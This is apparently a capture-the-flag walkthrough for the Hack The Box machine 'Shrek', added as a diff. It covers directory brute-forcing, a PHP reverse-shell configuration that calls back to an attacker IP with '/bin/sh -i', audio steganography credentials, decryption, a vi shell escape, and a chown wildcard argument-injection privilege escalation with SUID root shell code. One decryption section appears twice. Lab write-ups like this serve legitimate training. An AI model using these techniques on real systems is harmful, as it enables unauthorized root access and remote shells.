@@ -1,0 +1,173 @@
+1. Usual nmap scan, proceed to use burp and go the http website.
+   Port 80 is open so we investigate, there is no login console. We now refer to dirbuster to find any other
+   hidden directories.
+
+2. Gobuster is used: gobuster dir -u 10.10.10.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 25 -o log.txt
+   We find a couple of directories
+	/images (Status: 301)
+	/uploads (Status: 301)
+	/upload.html (Status: 200)
+	/upload.php (Status: 200)
+	/About.html (Status: 200)
+	/Index.html (Status: 200)
+	/Gallery.html (Status: 200)
+	/Sitemap.html (Status: 200)
+	/memes (Status: 301)
+   Our directiry of interest is uploads and we find a variety of files that we could download and analyze in
+   our case, we look at one of our files source code which you can find in the following link:
+	view-source:http://10.10.10.47/uploads/secret_ultimate.php
+  Inside the source code we can find the a hidden directory or in this case file that was previously not 
+  listed. 
+	<?php
+
+	set_time_limit (0);
+	$VERSION = "1.0";
+	$end_path = site/secret_area_51 // friggin' finally found the secret dir!!
+	$ip = '10.10.14.63';  // CHANGE THIS
+	$port = 1234;       // CHANGE THIS
+	$chunk_size = 1400;
+	$write_a = null;
+	$error_a = null;
+	$shell = 'uname -a; w; id; /bin/sh -i';
+	$daemon = 0;
+	$debug = 0;
+
+   The file being secret_area_51. If we perform a wget and play the song it is a smashmouth song however at
+   the end of the song there is static. Our next step is to analyze the file using audacity.
+
+3. We analyze the file with audacity and realize that there is static playing the last 10 seconds of the 
+   song. We now decide to crop out the beginning part of the song and analyze the static portion of the song
+   Playing with spectrogram settings of the static portion by modifying the max frequency to 10000 and 
+   window size to 512 we are able to see credentials that might be used for ssh or ftp. The creds being:
+
+	donkey:d0nk3y1337!
+
+   A screenshot in the stego directory that resides in shrek shows the creds.
+
+4. We now use the creds to login into ftp or ssh. We are able to login successfully via ftp.
+   We reside in a directory within ftp that has a lot of files. To download files without asking as for 
+   confirmation type in "prompt" and do an "mget *". 
+
+5. We find a key, which will probably be used for ssh authentication, we now to see what each of these files
+   is used for. We can try to base64 decode all files and see what we can come up with.
+	for i in `ls *.txt`; do echo $i; base64 -d $i > $i.b64 ; done
+  We get invalid inputs for 2 files which are of interest now.
+	6c8d7f8272d041da9bc67aa2da70c726.txt and 901718156363442bb0bc34b645a47198.txt
+
+ Seems to be a bunch of gibberish. Oddly enough 2 of the files seem to contain spaces in 
+   between a base64 encoded string.
+
+root@kali:~/htb/shrek# echo "J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=" |base64 -d
+'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'root@kali:~/htb/shrek#           echo "UHJpbmNlQ2hhcm1pbmc=" | base64 -d
+PrinceCharmingroot@kali:~/htb/shrek# 
+
+  One has "PrinceCharming":"6c8d7f8272d041da9bc67aa2da70c726.txt" embeded in it ad the other a hex endoded 
+  string that might be using some sort of encryption method.
+  "'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'":"901718156363442bb0bc34b645a47198.txt".
+
+  Guesswork now comes in since we need to guess a bunch of crypto algorithms to gather what we need to
+  decypt the text we found. Googling python ecc decrypt. We get ecc seccure so we just install it with pip.
+	pip install seccure
+  
+  We can now use the secure module along with the "PrinceCharming" key to decrypt the byte oriented output.
+
+root@kali:~/htb/shrek/ftp# python
+Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
+[GCC 9.2.1 20191008] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import seccure
+>>> ct='\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
+>>> seccure.decrypt(ct, b"PrinceCharming")
+'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'
+>>> 
+
+
+  We now have the ssh username and password. sec:shr3k1sb3st!
+  
+
+
+  
+  We can now use the secure module along with the "PrinceCharming" key to decrypt the byte oriented output.
+
+root@kali:~/htb/shrek/ftp# python
+Python 2.7.17 (default, Oct 19 2019, 23:36:22) 
+[GCC 9.2.1 20191008] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import seccure
+>>> ct='\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'
+>>> seccure.decrypt(ct, b"PrinceCharming")
+'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'
+>>> 
+
+
+  We now have the ssh username and password. sec:shr3k1sb3st!
+	ssh sec@10.10.10.47 -i key 
+
+6. We now verify what kindsof  privesc we can discover. First try "sudo -l", we are allowed to run commands
+   as user farquad we switch to the farquad user by using "vi" and instantiating a shell from within 
+   ":!/bin/bash". We go to farquad users directory but find nothing of substance in their except a 
+   binary "mirror" owned by root. However this turns out to be a rabbit hole, so we need to look for other 
+   info ro how to escalate.
+
+7. What we want to do now is some incident response by analyzing what files where created before and after
+   the hacker was on the box. 2 days before and after.
+	find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24
+
+[sec@shrek ~]$ find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24 -ls 2>/dev/null
+    18518      4 -rw-r--r--   1  root     root            6 Aug 23  2017 /etc/hostname
+    18515      4 -rw-r--r--   1  root     root          389 Aug 23  2017 /etc/netctl/static
+    35103      8 -rw-r--r--   1  root     root         4606 Aug 21  2017 /etc/vsftpd.conf
+   138139      4 -rw-r--r--   1  root     root          196 Aug 23  2017 /etc/systemd/system/netctl@static.service
+    33988      4 -rw-------   1  root     root          929 Aug 21  2017 /etc/shadow
+    33931      4 -rw-r--r--   1  root     root          968 Aug 21  2017 /etc/passwd
+       17      4 -r--r--r--   1  root     root           33 Aug 22  2017 /home/sec/user.txt
+       18      0 -rw-------   1  root     root            0 Aug 22  2017 /home/sec/.bash_history
+   138145      4 -rw-------   1  root     root           97 Aug 22  2017 /var/spool/cron/root
+   138101  16388 -rw-r-----   1  root     systemd-journal 16777216 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@00055747c657656c-ad9ea2c5440b64ec.journal~
+   138138   8192 -rw-r-----   1  root     systemd-journal  8388608 Aug 21  2017 /var/log/journal/84d230a047b241c6be827bd5ce531868/system@0005574ac144c200-f23de797a5b2e762.journal~
+   131087      8 -rw-------   1  root     root                7948 Aug 23  2017 /var/log/vsftpd.log.2
+   137786     16 -rw-------   1  root     utmp               15744 Aug 22  2017 /var/log/btmp.1
+   137906     12 -rw-r--r--   1  root     root                9833 Aug 23  2017 /var/log/httpd/error_log.2
+   137811 264656 -rw-r--r--   1  root     root            271001726 Aug 23  2017 /var/log/httpd/access_log.2
+    20283      4 -rw-r--r--   1  root     root                   91 Aug 22  2017 /usr/src/thoughts.txt
+
+  We tale an interest in the /usr/src/thought.txt file, we create a file in that directory and notice that
+  after every 5 minutes a file is changed a nobody user owner. We come to find out that each file is getting
+  chowned meaning that there might be an exploit with regards the chown file. We come to find out that there
+  is indeed a exploit with wildcard. More details of the exploit can be found on:
+  https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+ 
+  The vulnerability come from the way the chown wildcard works, the thoughts.txt file has permissions of
+  root, to take advantage of this file having those permissions in that directory we could create a file 
+  named by the following: 
+	touch -- references=thoughts.txt
+  
+  What the references option does with chown is that it tells chown to change the owner file permissions to
+  those of the thoughts.txt which is root. So now we create an suid binary shell that will give us root 
+  privileges.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(int argc, char *argv[])
+{
+	setreuid(0,0);
+	execve("/bin/sh", NULL, NULL);
+}
+
+gcc exec.c -o exec
+
+The file after 5 minutes is now owened by root
+[sec@shrek src]$ ls -lah
+total 28K
+drwxr-xr-x 2 sec  root  4.0K Jan 26 06:17  .
+drwxr-xr-x 8 sec  root  4.0K Aug 16  2017  ..
+-rwsr-sr-x 1 root root  8.3K Jan 26 06:17  exec
+-rw-r--r-- 1 root root   145 Jan 26 06:17  exec.c
+-rw-r--r-- 1 root root     0 Jan 26 06:08  hellothere
+lrwxrwxrwx 1 sec  users   11 Jan 26 06:09  passwd -> /etc/passwd
+-rw-r--r-- 1 sec  users    0 Jan 26 06:10 '--reference=thoughts.txt'
+-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt
+
+
+  Check man pages of chown. We should now execute "exec" and have root privileges.
